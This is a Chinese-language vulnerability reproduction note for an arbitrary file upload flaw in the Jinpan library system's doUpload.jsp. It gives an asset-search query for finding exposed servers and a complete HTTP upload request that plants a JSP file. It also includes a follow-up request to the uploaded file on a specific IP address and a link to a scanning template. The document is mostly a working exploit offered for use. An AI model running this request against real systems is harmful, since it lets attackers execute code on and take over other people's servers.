# 金盘图书馆系统doUpload存在任意文件上传漏洞

# 一、漏洞简介
金盘图书馆系统doUpload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 金盘图书馆系统

# 三、资产测绘
+ hunter`web.body="/opac/opacRssCollect"`
+ 特征

![1706076005993-3c01f170-38cf-4fef-a8a9-9f2b8d038e47.png](./img/J_6NyNKSVhklsxlG/1706076005993-3c01f170-38cf-4fef-a8a9-9f2b8d038e47-740576.png)

# 四、漏洞复现
```plain
POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Length: 235
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=----xbkdgks1fwucvok84tce
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1

------xbkdgks1fwucvok84tce
Content-Disposition: form-data; name="file";filename="tvrodinjqx.jsp"

<%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------xbkdgks1fwucvok84tce--
```

![1706076044489-305f3cf0-e373-47b5-b0f9-c72f0570d05f.png](./img/J_6NyNKSVhklsxlG/1706076044489-305f3cf0-e373-47b5-b0f9-c72f0570d05f-592253.png)

上传文件位置

```plain
GET /upload/2024-01-24/1706077745930.jsp HTTP/1.1
Host: 42.247.6.28:9090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
```

![1706077840008-2a84e501-4e3c-4484-8b55-93a74b9f3b96.png](./img/J_6NyNKSVhklsxlG/1706077840008-2a84e501-4e3c-4484-8b55-93a74b9f3b96-027567.png)

[金盘图书馆系统-doupload-任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222151277-db0f2eb8-6fd5-4fbe-957a-bab7b52f6727.yaml)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/om1k8iewd86fg4op>